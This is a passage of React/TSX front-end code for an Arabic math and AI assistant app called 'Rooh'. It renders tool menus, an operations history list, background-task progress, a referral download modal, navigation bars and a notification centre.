                   { id: 'settings', label: 'إعدادات النظام', icon: SettingsIcon, color: 'text-amber-600 dark:text-amber-400', bg: 'bg-amber-600/10' },
                 ].map((tool) => (
                   <button
                     key={tool.id}
                     onClick={() => setMoreSubTab(tool.id)}
                     className="flex flex-col items-center gap-3 p-5 rounded-2xl bg-white dark:bg-[#121417] border border-gray-200 dark:border-gray-800 hover:border-gray-300 dark:hover:border-gray-600 transition-all active:scale-95 group shadow-lg"
                   >
                     <div className={cn("p-3 rounded-xl transition-transform group-hover:scale-110", tool.bg)}>
                       <tool.icon size={24} className={tool.color} />
                     </div>
                     <span className="text-[11px] font-black italic text-gray-700 dark:text-gray-300">{tool.label}</span>
                   </button>
                 ))}
               </div>

               {/* Rooh Tools Extensions */}
               <div className="space-y-3 pb-24 mt-6 overflow-hidden">
                  <button 
                    onClick={() => setMoreSubTab('referral')}
                    className="w-full flex items-center justify-between p-6 bg-gradient-to-r from-blue-600/5 to-indigo-600/5 dark:from-blue-600/10 dark:to-indigo-600/10 border border-gray-200 dark:border-blue-500/20 rounded-[2rem] hover:bg-blue-600/10 transition-all group shadow-sm"
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-3 bg-blue-600/10 rounded-2xl group-hover:scale-110 transition-transform">
                        <Share2 size={24} className="text-blue-600 dark:text-blue-400" />
                      </div>
                      <div className="text-right">
                        <h3 className="text-sm font-black text-gray-900 dark:text-white italic">عداد المشاركة</h3>
                        <p className="text-[10px] text-gray-700 dark:text-gray-500 font-bold uppercase tracking-widest">تتبع دعوتك للأصدقاء والمكافآت</p>
                      </div>
                    </div>
                    <ChevronLeft size={20} className="text-gray-400 dark:text-gray-600" />
                  </button>

                  <button 
                    onClick={() => setMoreSubTab('about')}
                    className="w-full flex items-center justify-between p-6 bg-white dark:bg-[#15181c] border border-gray-200 dark:border-gray-800 rounded-[2rem] hover:border-gray-300 dark:hover:border-gray-600 transition-all group"
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-3 bg-fuchsia-600/10 rounded-2xl group-hover:scale-110 transition-transform">
                        <BrainCircuit size={24} className="text-fuchsia-600 dark:text-fuchsia-500" />
                      </div>
                      <div className="text-right">
                        <h3 className="text-sm font-black text-gray-900 dark:text-white italic">حول روح الذكية</h3>
                        <p className="text-[10px] text-gray-700 dark:text-gray-500 font-bold uppercase tracking-widest">فلسفة الابتكار وكيفية الاستخدام</p>
                      </div>
                    </div>
                    <ChevronLeft size={20} className="text-gray-400 dark:text-gray-600" />
                  </button>

                  <button 
                    onClick={() => setMoreSubTab('complaints')}
                    className="w-full flex items-center justify-between p-6 bg-white dark:bg-[#15181c] border border-gray-200 dark:border-gray-800 rounded-[2rem] hover:border-gray-300 dark:hover:border-gray-600 transition-all group shadow-xl"
                  >
                    <div className="flex items-center gap-4">
                      <div className="p-3 bg-emerald-600/10 rounded-2xl group-hover:scale-110 transition-transform">
                        <Heart size={24} className="text-emerald-600 dark:text-emerald-500" />
                      </div>
                      <div className="text-right">
                        <h3 className="text-sm font-black text-gray-900 dark:text-white italic">ركن عائلة روح</h3>
                        <p className="text-[10px] text-gray-700 dark:text-gray-500 font-bold uppercase tracking-widest">تواصل مباشر مع الإدارة للشكاوي</p>
                      </div>
                    </div>
                    <ChevronLeft size={20} className="text-gray-400 dark:text-gray-600" />
                  </button>
               </div>
             </div>
          )}
        </div>
      );
      case 'history': return (
        <div className="flex flex-col h-full p-4 overflow-y-auto custom-scrollbar max-w-lg mx-auto w-full">
          <div className="flex flex-col gap-2 mb-6 animate-in slide-in-from-top duration-500">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-2xl font-black italic text-gray-900 dark:text-white">سجل العمليات</h2>
                <p className="text-[10px] text-gray-700 dark:text-gray-500 font-bold mt-1 uppercase tracking-widest leading-none italic">آخر 50 عملية قمت بها</p>
              </div>
              <button 
                onClick={clearHistory}
                className="p-3 text-gray-400 hover:text-red-500 hover:bg-red-500/10 rounded-2xl transition-all active:scale-90"
                title="مسح السجل"
              >
                <Trash2 size={24} />
              </button>
            </div>
            <div className="h-1.5 w-20 bg-blue-600 rounded-full" />
          </div>

          <div className="space-y-4 pb-10">
            {appHistory.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-24 text-gray-200 dark:text-gray-800">
                <History size={80} className="stroke-[0.5] mb-6 animate-pulse" />
                <p className="text-base font-black italic uppercase tracking-tighter text-gray-900 dark:text-gray-200">السجل فارغ حالياً</p>
                <p className="text-[10px] font-bold mt-2 text-gray-700 dark:text-gray-500">جميع حساباتك وتحويلاتك ستظهر هنا</p>
              </div>
            ) : (
              appHistory.map((item, idx) => (
                <motion.div 
                  key={item.id} 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: idx * 0.05 }}
                  className="bg-white dark:bg-[#15181c] border border-gray-100 dark:border-gray-800/60 p-5 rounded-[2rem] flex items-center justify-between group shadow-xl transition-all hover:border-blue-500/30 active:scale-[0.98]"
                >
                  <div className="flex flex-col gap-2 flex-1 min-w-0 pr-2">
                    <div className="flex items-center gap-2">
                      <div className={cn(
                        "w-2 h-2 rounded-full",
                        item.type === 'calculator' ? "bg-amber-500" : item.type === 'ai' ? "bg-purple-500" : "bg-blue-500"
                      )} />
                      <span className="text-xs font-black text-gray-900 dark:text-gray-100 truncate italic">{item.title}</span>
                    </div>
                    
                    <div className="flex items-center gap-2">
                       <span className="text-[8px] font-black text-blue-500 dark:text-blue-400 bg-blue-500/5 dark:bg-blue-500/10 px-2 py-0.5 rounded-lg uppercase tracking-tighter italic border border-blue-500/10">
                         {item.type === 'calculator' ? 'حساب' : item.type === 'ai' ? 'ذكاء' : 'تحويل'}
                       </span>
                       <span className="text-[8px] text-gray-400 font-bold italic opacity-60">{new Date(item.timestamp).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}</span>
                    </div>

                    {item.details && (
                       <p className="text-[9px] text-gray-500 font-bold dark:text-gray-400 opacity-80">{item.details}</p>
                    )}

                    {item.result && (
                      <div className="mt-3 bg-gray-50 dark:bg-black/20 p-3 rounded-2xl border border-gray-100 dark:border-gray-800/30">
                        <p className="text-[10px] text-gray-600 dark:text-gray-300 font-mono font-medium whitespace-pre-wrap break-all leading-relaxed ltr text-left" dir="ltr">
                          {item.result}
                        </p>
                      </div>
                    )}
                  </div>
                  
                  {item.result && (
                    <button 
                      onClick={() => handleCopy(item.result || '')}
                      className="p-3 text-gray-400 hover:text-blue-500 dark:hover:text-blue-400 hover:bg-blue-500/10 rounded-2xl transition-all active:scale-90 flex-shrink-0"
                    >
                      <Copy size={20} />
                    </button>
                  )}
                </motion.div>
              ))
            )}
          </div>
        </div>
      );


      default: return null;
    }
  };

  return (
    <div className="relative h-[100dvh] w-screen bg-[#0c0d0f]">
      {/* Pending Result Notification Window */}
      <AnimatePresence>
        {pendingResult && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/80 backdrop-blur-md">
            <motion.div 
               initial={{ scale: 0.9, opacity: 0 }}
               animate={{ scale: 1, opacity: 1 }}
               exit={{ scale: 0.9, opacity: 0 }}
               className="bg-white dark:bg-black border border-blue-500/20 dark:border-gray-800 rounded-[2.5rem] p-8 max-w-sm w-full shadow-2xl relative"
            >
               <button 
                 onClick={() => setPendingResult(null)} 
                 className="absolute top-6 right-6 p-2 text-gray-400 hover:text-blue-500 dark:hover:text-white transition-colors"
               >
                 <ChevronDown size={24} />
               </button>
               <div className="flex flex-col items-center text-center gap-6">
                  <div className="p-5 bg-blue-600/10 dark:bg-emerald-600/20 rounded-3xl animate-bounce shadow-xl shadow-blue-500/10">
                    <Sparkles size={32} className="text-blue-600 dark:text-emerald-400" />
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-xl font-black text-gray-900 dark:text-white italic">اكتملت المهمة!</h3>
                    <p className="text-[10px] text-blue-600 dark:text-gray-400 font-bold uppercase tracking-widest leading-none">نجاح في الخلفية</p>
                  </div>
                  <div className="w-full bg-blue-50 dark:bg-white/5 border border-blue-100 dark:border-white/10 rounded-2xl p-4 max-h-[200px] overflow-y-auto text-right custom-scrollbar">
                    <p className="text-xs text-blue-800 dark:text-gray-300 leading-relaxed break-words whitespace-pre-wrap font-medium">
                      {typeof pendingResult.result === 'string' ? pendingResult.result : 'النتيجة جاهزة للاستخدام في القسم المخصص'}
                    </p>
                  </div>
                  <div className="flex flex-col gap-2 w-full">
                    <button 
                      onClick={() => {
                        if (pendingResult.target) {
                          setActiveTab(pendingResult.target.tab as any);
                          if (pendingResult.target.subTab) setMoreSubTab(pendingResult.target.subTab);
                        }
                        setPendingResult(null);
                      }}
                      className="w-full py-3 bg-blue-600 text-white rounded-xl font-bold text-xs"
                    >
                      {pendingResult.target ? 'الانتقال إلى القسم' : 'حسناً'}
                    </button>
                    <div className="flex gap-2">
                       <button 
                        onClick={() => setPendingResult(null)}
                        className="flex-1 py-3 bg-gray-800 text-gray-300 rounded-xl font-bold text-xs"
                      >
                        إغلاق
                      </button>
                      {typeof pendingResult.result === 'string' && (
                        <button 
                          onClick={() => handleCopy(pendingResult.result)}
                          className="flex-1 py-3 bg-emerald-600 text-white rounded-xl font-bold text-xs"
                        >
                          نسخ
                        </button>
                      )}
                    </div>
                  </div>
               </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>


      {/* Global Background Progress Indicator */}
      {bgTasks.some(t => t.status === 'loading') && !isBgIndicatorHidden && (
        <motion.div 
          initial={{ opacity: 0, y: 50, scale: 0.9 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          exit={{ opacity: 0, y: 50, scale: 0.9 }}
          className="fixed bottom-24 right-6 left-6 xs:left-auto xs:right-6 lg:right-12 z-[60] flex items-center gap-4 bg-white dark:bg-black backdrop-blur-2xl border border-blue-200 dark:border-white/10 p-4 rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.1)] dark:shadow-[0_20px_50px_rgba(0,0,0,0.8)] group transition-all"
        >
           <div 
             className="flex-1 flex items-center gap-4 cursor-pointer"
             onClick={() => {
              const loadingTask = bgTasks.find(t => t.status === 'loading');
              if (loadingTask?.target) {
                setActiveTab(loadingTask.target.tab as any);
                if (loadingTask.target.subTab) setMoreSubTab(loadingTask.target.subTab);
              }
            }}
           >
            <div className="relative flex items-center justify-center shrink-0">
              {bgTasks.find(t => t.status === 'loading')?.progress !== undefined ? (
                <CircularProgress progress={bgTasks.find(t => t.status === 'loading')!.progress!} size={48} strokeWidth={4} />
              ) : (
                <div className="w-10 h-10 bg-blue-600/10 dark:bg-white/5 rounded-full flex items-center justify-center">
                  <RefreshCw className="animate-spin text-blue-600 dark:text-emerald-400" size={20} />
                </div>
              )}
              <div className="absolute inset-0 flex items-center justify-center">
                  <RoohLoader size={20} />
              </div>
            </div>
            
              <div className="flex flex-col flex-1 min-w-0" dir="rtl">
                <div className="flex items-center justify-between gap-2">
                  <span className="text-[9px] text-blue-700 dark:text-emerald-400 font-black uppercase tracking-widest leading-none">مهمة جارية الآن</span>
                  <span className="text-[10px] text-gray-500 dark:text-emerald-400 font-mono italic">
                    {Math.round(bgTasks.find(t => t.status === 'loading')?.progress || 0)}%
                  </span>
                </div>
                <span className="text-xs text-gray-900 dark:text-white font-black italic truncate mt-1 text-right">
                  {bgTasks.find(t => t.status === 'loading')?.label || 'روح تعمل...'}
                </span>
                <p className="text-[8px] text-blue-600/70 dark:text-emerald-500/70 mt-0.5 truncate italic text-right">سيتم إشعارك عند اكتمال العملية ✨</p>
              </div>
           </div>
           
           <div className="flex flex-col gap-1">
             <button 
               onClick={() => setIsBgIndicatorHidden(true)}
               className="p-2 bg-gray-100 dark:bg-white/5 rounded-xl hover:bg-red-500/20 text-gray-500 dark:text-gray-400 hover:text-red-500 transition-all flex items-center justify-center"
               title="إخفاء"
             >
                <X size={16} />
             </button>
                    <div 
                      onClick={() => {
                        const loadingTask = bgTasks.find(t => t.status === 'loading');
                        if (loadingTask?.target) {
                          setActiveTab(loadingTask.target.tab as any);
                          if (loadingTask.target.subTab) setMoreSubTab(loadingTask.target.subTab);
                        }
                      }}
                      className="p-2 bg-white/5 rounded-xl hover:bg-blue-600 transition-colors cursor-pointer flex items-center justify-center"
                    >
                      <ChevronLeft size={16} className="text-white" />
                    </div>
           </div>
        </motion.div>
      )}

      {publicBirthdayUser && (
        <div className="fixed inset-0 z-[10000] bg-[#0a0a0b] overflow-hidden">
          <PublicBirthdayPage 
            usernameEn={publicBirthdayUser} 
            onBack={() => {
              const url = new URL(window.location.href);
              url.searchParams.delete('b');
              window.history.pushState({}, '', url.pathname + url.search);
              setPublicBirthdayUser(null);
            }} 
          />
        </div>
      )}

      {showReferralApkModal && (
        <div className="fixed inset-0 z-[10005] bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="w-full max-w-md bg-white dark:bg-[#1A1C20] border-2 border-emerald-500/30 rounded-[2.5rem] p-7 text-center shadow-2xl relative overflow-hidden"
          >
            {/* Visual background sparkles */}
            <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/10 rounded-full filter blur-3xl pointer-events-none" />
            <div className="absolute bottom-0 left-0 w-32 h-32 bg-blue-500/10 rounded-full filter blur-3xl pointer-events-none" />
            
            {/* Crown icon with glowing breathing effect */}
            <div className="relative z-10 flex justify-center mb-6">
              <motion.div 
                animate={{ scale: [1, 1.08, 1] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="w-20 h-20 bg-gradient-to-br from-emerald-500 to-teal-600 text-white rounded-3xl flex items-center justify-center shadow-xl shadow-emerald-500/20 border border-emerald-400/30"
              >
                <Sparkles size={40} className="text-white" />
              </motion.div>
            </div>

            <div className="relative z-10 space-y-4">
              <h3 className="text-xl sm:text-2xl font-black italic text-gray-900 dark:text-white leading-relaxed text-center font-sans tracking-tight">
                {referrerProfileName ? (
                  <>✨ يدعوك <span className="text-emerald-500 underline decoration-dashed decoration-2">{referrerProfileName}</span> للانضمام لعائلة روح ✨</>
                ) : (
                  <>✨ دعوة انضمام خاصة لشبكة روح الذكية ✨</>
                )}
              </h3>
              
              <div className="p-4 bg-emerald-50 dark:bg-emerald-950/20 border border-emerald-100 dark:border-emerald-500/10 rounded-2xl">
                <p className="text-xs sm:text-sm text-emerald-950 dark:text-emerald-200/90 leading-relaxed text-right font-medium">
                  مرحباً بك! لقد دعاك صديقك لتحميل وتثبيت النسخة المعتمدة والمعدلة من <span className="font-extrabold italic text-emerald-600 dark:text-emerald-400">تطبيق روح الذكي</span>. 
                  <br /><br />
                  الحصول على التطبيق المثبت على جهازك يمنحك سرعة فائقة، خلفيات ملكية مذهلة للبطاقات، تحسين جودة الصوت بالكامل، تفعيل الإشعارات وتحديثات فورية مخصصة ترفعها الإدارة مباشرة من الكنترول!
                </p>
              </div>

              <div className="flex flex-col gap-3 pt-2">
                <button 
                  onClick={() => {
                    setShowReferralApkModal(false);
                    handleDownloadAndroid();
                  }}
                  className="w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white py-4 px-6 rounded-2xl font-black italic shadow-lg shadow-emerald-500/20 hover:shadow-emerald-600/30 transition-all flex items-center justify-center gap-2 cursor-pointer"
                >
                  <span>📲 تحميل وحفظ التطبيق الآن</span>
                </button>
                
                <button 
                  onClick={() => {
                    setShowReferralApkModal(false);
                    showToast('تصفح ممتع! يمكنك في أي وقت تثبيت التطبيق من الخيارات الجانبية مجاناً. ✨', 'info');
                  }}
                  className="w-full bg-gray-100 dark:bg-white/5 hover:bg-gray-200 dark:hover:bg-white/10 text-gray-700 dark:text-gray-300 py-3.5 px-6 rounded-2xl font-black text-sm transition-all cursor-pointer"
                >
                  تصفح نسخة الويب مؤقتاً
                </button>
              </div>
            </div>
          </motion.div>
        </div>
      )}
      {/* Hidden Video for Smart Capture */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        className="fixed opacity-0 pointer-events-none w-1 h-1"
      />

      <AnimatePresence>
        {activeAdminPanel === '9865' && (
          <AdminPanel9865
            tips={usageGuideTips}
            onUpdateTips={setUsageGuideTips}
            onClose={() => setActiveAdminPanel(null)}
            showToast={showToast}
          />
        )}
        {activeAdminPanel === '6532' && (
          <ForensicPanel6532
            onClose={() => setActiveAdminPanel(null)}
            showToast={showToast}
          />
        )}
      </AnimatePresence>

      <AnimatePresence>
        {isLanding && (
          <motion.div
            initial={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.5 }}
            onClick={() => setIsLanding(false)}
            className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-white dark:bg-[#0c0d0f] select-none cursor-pointer"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={imageReady ? { scale: 1, opacity: 1 } : {}}
              transition={{ duration: 0.5, ease: "easeOut" }}
              className="flex flex-col items-center gap-8"
            >
              <div className="relative">
                <RoohLoader size={280} className="sm:w-[400px] sm:h-[400px]" />
                <motion.div 
                  animate={{ opacity: [0.2, 0.4, 0.2] }}
                  transition={{ duration: 2, repeat: Infinity }}
                  className="absolute -inset-10 bg-blue-500/10 blur-[80px] rounded-full -z-20"
                />
              </div>
              
              <div className="flex flex-col items-center gap-2">
                <h1 className="text-3xl font-black text-white italic tracking-tighter drop-shadow-md">حساب روح الذكي</h1>
                <p className="text-blue-400 font-bold text-xs uppercase tracking-widest animate-pulse">جاري تهيئة المحرك...</p>
              </div>

              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={imageReady ? { opacity: 1, y: 0 } : {}}
                transition={{ delay: 1, duration: 0.5 }}
                className="mt-8 max-w-xs text-center px-6 py-4 bg-white/5 backdrop-blur-xl rounded-2xl border border-white/10 shadow-2xl"
              >
                <div className="flex items-center justify-center gap-2 text-blue-400 font-bold mb-2">
                  <Camera size={18} />
                  <span className="text-sm">استخدام الكاميرا للمسائل</span>
                </div>
                <p className="text-[11px] text-gray-400 font-medium leading-relaxed">
                  سنطلب منك السماح بالوصول للكاميرا فقط عند رغبتك بتصوير أي مسألة ليقوم "روح" بتحليلها وحلّها فوراً.
                </p>
              </motion.div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="flex flex-col lg:flex-row h-full w-full bg-white dark:bg-[#0c0d0f] text-gray-900 dark:text-gray-200 overflow-hidden font-sans select-none">
      {/* Desktop Sidebar */}
        <nav className="hidden lg:flex flex-col w-72 bg-gray-50 dark:bg-[#1a1a1a] border-l lg:border-l-0 lg:border-r border-gray-200 dark:border-gray-800/40 h-full p-6 transition-colors">
        <a 
          href="https://www.instagram.com/roohyosif?igsh=a3d6ZG91YzlyN2hr" 
          onClick={handleInstagramClick}
          target="_blank" 
          rel="noopener noreferrer"
          className="flex items-center gap-3 mb-10 hover:opacity-80 transition-opacity px-2"
        >
          <RoohLoader size={45} />
          <div className="flex flex-col">
            <h1 className="text-xl font-black text-gray-900 dark:text-white italic leading-none">حساب روح</h1>
            <span className="text-[10px] text-blue-600 dark:text-blue-400 font-bold uppercase tracking-wider mt-1">النسخة الاحترافية</span>
          </div>
        </a>

        <div className="flex flex-col gap-2 flex-1">
          <div className="flex items-center justify-between mb-4 px-2">
            <button 
              onClick={() => setActiveTab('history')}
              className={cn(
                "transition-all hover:bg-gray-200 dark:hover:bg-gray-800 rounded-xl", 
                isAndroidInstalled ? "p-2" : "p-1.5",
                activeTab === 'history' ? "text-blue-600 dark:text-blue-400 bg-blue-600/10" : "text-gray-400 dark:text-gray-500"
              )}
              title="السجل"
            >
              <History size={isAndroidInstalled ? 20 : 14} />
            </button>
            <div className="flex gap-1 items-center">
              {!isAndroidInstalled && (
                <button 
                  onClick={handleDownloadAndroid}
                  className="p-1.5 text-emerald-500 bg-emerald-600/10 hover:bg-emerald-600/20 border border-emerald-500/25 rounded-xl transition-all cursor-pointer shadow-sm" 
                  title="تنزيل وتثبيت كأندرويد أوفلاين"
                >
                  <Download size={14} className="animate-bounce" />
                </button>
              )}
              <button 
                onClick={() => setShowNotificationCenter(true)}
                className={cn(
                  "text-gray-400 dark:text-gray-500 hover:text-gray-900 dark:hover:text-white hover:bg-gray-200 dark:hover:bg-gray-800 rounded-xl transition-all relative",
                  isAndroidInstalled ? "p-2" : "p-1.5"
                )}
                title="الإشعارات"
              >
                {notifications.some(n => !n.read) && (
                  <span className="absolute top-1 right-1 w-2 h-2 bg-rose-500 rounded-full animate-ping" />
                )}
                <Bell size={isAndroidInstalled ? 20 : 14} />
              </button>
              <button 
                onClick={() => { setActiveTab('tools'); setMoreSubTab('settings'); }} 
                className={cn(
                  "text-gray-400 dark:text-gray-500 hover:text-gray-900 dark:hover:text-white hover:bg-gray-200 dark:hover:bg-gray-800 rounded-xl transition-all",
                  isAndroidInstalled ? "p-2" : "p-1.5"
                )}
                title="الإعدادات"
              >
                <SettingsIcon size={isAndroidInstalled ? 20 : 14} />
              </button>
            </div>
          </div>
              {TABS.map((tab) => {
                const Icon = tab.icon;
                return (
                  <button
                    key={`sidebar-${tab.id}`}
                    type="button"
                    onClick={() => {
                  if (tab.id === 'chat') {
                    setActiveTab('chat');
                    setMoreSubTab(null);
                  } else {
                    setActiveTab(tab.id as any);
                    setMoreSubTab(null);
                  }
                }}
                className={cn(
                  "flex items-center gap-4 px-5 py-4 rounded-xl transition-all relative group overflow-hidden",
                  activeTab === tab.id 
                    ? "text-blue-600 dark:text-blue-400 bg-blue-600/10 font-bold" 
                    : "text-gray-500 hover:bg-gray-200 dark:hover:bg-gray-800 hover:text-gray-900 dark:hover:text-gray-300"
                )}
              >
                {activeTab === tab.id && (
                  <motion.div layoutId="activeTabIndicator" className="absolute right-0 top-0 bottom-0 w-1 bg-blue-500 rounded-full" />
                )}
                <Icon size={20} />
                <span className="text-sm">{tab.label}</span>
              </button>
            );
          })}

          {/* Desktop PWA buttons */}
          <div className="mt-4 flex flex-col gap-2">
            {showInstallBtn && (
              <button
                id="install-btn"
                onClick={handleInstallClick}
                className="flex items-center gap-4 px-5 py-4 rounded-xl text-emerald-400 bg-emerald-600/10 hover:bg-emerald-600/20 transition-all font-bold"
              >
                <Download size={20} />
                <span className="text-sm">تثبيت التطبيق</span>
              </button>
            )}
            <button
              id="share-app-btn"
              onClick={handleShareApp}
              className="flex items-center gap-4 px-5 py-4 rounded-xl text-gray-400 bg-gray-800/40 hover:bg-gray-800 transition-all font-bold"
            >
              <Share2 size={20} />
              <span className="text-sm">مشاركة التطبيق</span>
            </button>
          </div>
        </div>

        <div className="pt-6 border-t border-gray-800">
           <p className="text-[10px] text-gray-500 uppercase tracking-widest text-center">Smart Math Engine 2.0</p>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 flex flex-col relative h-full overflow-hidden">
        {/* Offline Banner */}
        <AnimatePresence>
          {!isOnline && (
            <motion.div 
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: 'auto', opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              className="bg-yellow-600/20 border-b border-yellow-500/30 px-4 py-1.5 flex items-center justify-center gap-2 overflow-hidden"
            >
              <div className="w-1.5 h-1.5 bg-yellow-500 rounded-full animate-pulse" />
              <span className="text-[10px] font-bold text-yellow-500">أنت تعمل الآن في وضع الأوفلاين (بدون إنترنت)</span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Mobile Header */}
        <header className="lg:hidden flex items-center justify-between p-4 bg-white dark:bg-[#0f1115] border-b border-gray-200 dark:border-gray-800/40 transition-colors">
           <a 
              href="https://www.instagram.com/roohyosif?igsh=a3d6ZG91YzlyN2hr" 
              onClick={handleInstagramClick}
              target="_blank" 
              rel="noopener noreferrer"
              className="flex items-center gap-2"
           >
            <RoohLoader size={32} />
            <h1 className="text-base font-black text-gray-900 dark:text-white italic">حساب روح</h1>
            <Instagram size={16} className="text-gray-900 dark:text-white" />
           </a>
            <div className="flex items-center gap-1.5">
               <button 
                 type="button"
                 onClick={() => setActiveTab('history')} 
                 className={cn(
                   "transition-all rounded-lg", 
                   isAndroidInstalled ? "p-2" : "p-1.5",
                   activeTab === 'history' ? "text-blue-500 dark:text-blue-400 bg-blue-600/10" : "text-gray-700 dark:text-gray-500"
                 )}
                 title="السجل"
               >
                  <History size={isAndroidInstalled ? 20 : 14} />
               </button>
               <button 
                 className={cn(
                   "text-gray-500 hover:text-white transition-all rounded-lg",
                   isAndroidInstalled ? "p-2" : "p-1.5"
                 )}
                 title="الإشعارات"
                 onClick={() => setShowNotificationCenter(true)}
               >
                 <Bell size={isAndroidInstalled ? 20 : 14} />
               </button>
               <button 
                 onClick={() => { setActiveTab('tools'); setMoreSubTab('settings'); }}
                 className={cn(
                   "text-gray-500 hover:text-white transition-all rounded-lg",
                   isAndroidInstalled ? "p-2" : "p-1.5"
                 )}
                 title="الإعدادات"
               >
                 <SettingsIcon size={isAndroidInstalled ? 20 : 14} />
               </button>
               {!isAndroidInstalled && (
                 <button 
                   id="install-btn"
                   type="button"
                   onClick={handleDownloadAndroid} 
                   className="p-1.5 rounded-lg text-emerald-500 bg-emerald-600/10 border border-emerald-500/20 active:scale-95 duration-150 transition-all cursor-pointer shadow-sm animate-pulse"
                   title="تنزيل وتثبيت كأندرويد أوفلاين"
                 >
                    <Download size={14} className="animate-bounce" />
                 </button>
               )}
               <button 
                 id="share-app-btn"
                 type="button"
                 onClick={handleShareApp} 
                 className={cn(
                   "text-blue-600 dark:text-blue-400 bg-blue-600/10 hover:bg-blue-600/20 transition-all active:scale-95 border border-blue-600/20 dark:border-blue-400/20 rounded-lg",
                   isAndroidInstalled ? "p-2" : "p-1.5"
                 )}
                 title="مشاركة"
               >
                  <Share2 size={isAndroidInstalled ? 20 : 14} />
               </button>
            </div>
        </header>

        <div className="flex-1 relative overflow-hidden bg-gray-50 dark:bg-[#0c0d0f] transition-colors">
          <AnimatePresence mode="wait">
            <motion.div
              key={activeTab}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
              className="absolute inset-0 z-10"
            >
              {renderTab()}
            </motion.div>
          </AnimatePresence>
        </div>

        {/* Mobile Navbar */}
        <nav className="lg:hidden flex items-center justify-around bg-white dark:bg-[#121212] border-t border-gray-100 dark:border-gray-800/40 pb-safe px-4 h-16 sm:h-20 shrink-0 transition-all shadow-[0_-5px_15px_rgba(0,0,0,0.05)]">
          {TABS.map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={`mobile-${tab.id}`}
                type="button"
                onClick={() => {
                  if (tab.id === 'chat') {
                    setActiveTab('chat');
                    setMoreSubTab(null);
                  } else {
                    setActiveTab(tab.id as any);
                    setMoreSubTab(null);
                  }
                }}
                className={cn(
                  "flex flex-col items-center gap-1.5 p-2 transition-all relative",
                  isActive ? "text-blue-600 dark:text-blue-400" : "text-gray-600 dark:text-gray-500"
                )}
              >
                {isActive && (
                  <motion.div layoutId="mobileTabActive" className="absolute -top-1 w-8 h-1 bg-blue-500 rounded-full" />
                )}
                <Icon size={20} strokeWidth={isActive ? 2.5 : 2} />
                <span className="text-[10px] font-bold">{tab.label}</span>
              </button>
            );
          })}
        </nav>
      </main>
    </div>

      {/* Global Modals & Toasts */}
      <AnimatePresence>
        {toast && (
          <Toast 
            message={toast.message} 
            type={toast.type} 
            onClose={() => setToast(null)} 
          />
        )}
        {showPermissionModal && (
          <PermissionModal 
            onConfirm={handlePermissionConfirm} 
            onCancel={handlePermissionCancel} 
          />
        )}
        {confirmModal && (
          <ConfirmationModal
            title={confirmModal.title}
            message={confirmModal.message}
            variant={confirmModal.variant}
            onConfirm={confirmModal.onConfirm}
            onCancel={() => setConfirmModal(null)}
          />
        )}
        {showNotificationCenter && (
          <div className="fixed inset-0 z-[100001] flex justify-end bg-black/60 backdrop-blur-sm">
            <motion.div 
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: 'spring', damping: 25, stiffness: 200 }}
              className="bg-white dark:bg-[#121417] w-full max-w-md h-full shadow-2xl p-6 flex flex-col justify-between border-l border-gray-200 dark:border-white/5 relative"
            >
              <div className="flex flex-col h-full overflow-hidden">
                <div className="flex items-center justify-between border-b pb-4 mb-4 border-gray-100 dark:border-white/5">
                  <div className="flex items-center gap-2">
                    <div className="p-2 bg-emerald-600/10 rounded-xl text-emerald-600">
                      <Bell size={20} />
                    </div>
                    <div className="text-right">
                      <h3 className="text-lg font-black text-gray-900 dark:text-white italic">مركز الإشعارات</h3>
                      <p className="text-[10px] text-gray-500 font-bold uppercase">صندوق إشعارات روح الذكي</p>
                    </div>
                  </div>
                  <button 
                    onClick={() => setShowNotificationCenter(false)}
                    className="p-2 text-gray-400 hover:text-gray-950 dark:hover:text-white rounded-xl transition-all cursor-pointer"
                  >
                    <X size={20} />
                  </button>
                </div>

                <div className="flex gap-2 mb-4 justify-end">
                  <button
                    onClick={() => {
                      setNotifications(prev => prev.map(n => ({ ...n, read: true })));
                      showToast('تم تحديد الكل كمقروء ✔️', 'success');
                    }}
                    className="px-3 py-1.5 bg-gray-100 dark:bg-white/5 text-gray-600 dark:text-gray-300 rounded-lg text-[10px] font-bold transition-all hover:bg-gray-200 cursor-pointer"
                  >
                    تحديد الكل كمقروء 📖
                  </button>
                  <button
                    onClick={() => {
                      setConfirmModal({
                        title: 'مسح التنبيهات 🧹',
                        message: 'هل أنت متأكد من رغبتك في مسح كافة التنبيهات؟',
                        variant: 'danger',
                        onConfirm: () => {
                          setNotifications([]);
                          localStorage.removeItem('rouh_user_notifications');
                          showToast('تم مسح صندوق التنبيهات بالكامل 🧹', 'info');
                          setConfirmModal(null);
